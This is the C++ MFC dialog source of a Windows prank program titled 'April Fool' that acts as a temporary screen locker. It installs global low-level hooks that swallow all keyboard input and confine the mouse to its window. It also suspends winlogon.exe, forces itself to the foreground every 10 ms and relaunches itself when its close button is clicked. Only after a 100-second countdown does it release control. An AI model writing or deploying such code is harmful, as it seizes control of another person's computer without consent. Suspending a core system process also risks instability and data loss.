
// April FoolDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "April Fool.h"
#include "April FoolDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CAprilFoolDlg 对话框



CAprilFoolDlg::CAprilFoolDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_APRILFOOL_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDI_GIFT);
	m_iTime = 100;
	flag = false;
#ifdef _DEBUG
	m_iTime = 10;
#endif
}

void CAprilFoolDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLOSE, Close);
	DDX_Control(pDX, IDC_QUIT, Quit);
	DDX_Control(pDX, IDC_DONTTOUCH, DT);
}

BEGIN_MESSAGE_MAP(CAprilFoolDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_MESSAGE(UM_REALQUIT, &CAprilFoolDlg::OnUmRealquit)
	ON_BN_CLICKED(IDC_CLOSE, &CAprilFoolDlg::OnBnClickedClose)
END_MESSAGE_MAP()


// CAprilFoolDlg 消息处理程序

BOOL CAprilFoolDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	SetTimer(1, 10, NULL);
	SetTimer(2, 1000, NULL);

	
	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
	nt.Suspend(TEXT("winlogon.exe"));
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CAprilFoolDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CAprilFoolDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}








void CAprilFoolDlg::OnTimer(UINT_PTR nIDEvent)
{
	switch (nIDEvent)
	{
	case 1:
	{
		if (!flag)
		{
			RECT rect;
			GetWindowRect(&rect);
			SetCursorPos((rect.left + rect.right) / 2, (rect.top + rect.bottom) / 2);
			hKbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, NULL, 0);
			flag = true;
		}
		::SetWindowPos(this->m_hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		AttachThreadInput(GetWindowThreadProcessId(::GetForegroundWindow(), NULL), GetCurrentThreadId(), TRUE);
		SetForegroundWindow();
		break;
	}
	case 2:
	{
		m_iTime--;
		CWnd* pTm = GetDlgItem(IDC_TM);
		TCHAR stm[4];
		_itow_s(m_iTime, stm, 10);
		pTm->SetWindowText(stm);
		if (m_iTime <= 0)
		{
			SendMessage(UM_REALQUIT);
			KillTimer(2);
		}
		break;
	}
	default:
		break;
	}
	
	
	CDialogEx::OnTimer(nIDEvent);
}


afx_msg LRESULT CAprilFoolDlg::OnUmRealquit(WPARAM wParam, LPARAM lParam)
{
	UnhookWindowsHookEx(hMouseHook);
	UnhookWindowsHookEx(hKbdHook);
	SetWindowText(TEXT("Happy April Fool's Day!"));
	TerminateProcess(theApp.hChild, 0);
	nt.Resume(TEXT("winlogon.exe"));
	Sleep(1000);
	PostQuitMessage(0);
	return 0;
}

LRESULT CALLBACK MouseHookProc(int ncode, WPARAM wParam, LPARAM lParam)
{
	LPMSLLHOOKSTRUCT lpMsLLHookStruct = (LPMSLLHOOKSTRUCT)lParam;
	RECT rc;
	AfxGetMainWnd()->GetWindowRect(&rc);
	CRect crc = rc;
	CPoint mspt = lpMsLLHookStruct->pt;
	if (crc.PtInRect(mspt))
		return CallNextHookEx(hMouseHook, ncode, wParam, lParam);
	else return 1;
}

LRESULT CALLBACK KbdHookProc(int ncode, WPARAM wParam, LPARAM lParam)
{
	return ncode >= 0 ? 1 : CallNextHookEx(hKbdHook, ncode, wParam, lParam);
}


void CAprilFoolDlg::OnBnClickedClose()
{
	ShellExecute(NULL, TEXT("open"), theApp.argv[0], TEXT(""), TEXT(""), SW_SHOW);
}


HHOOK hMouseHook;
HHOOK hKbdHook;
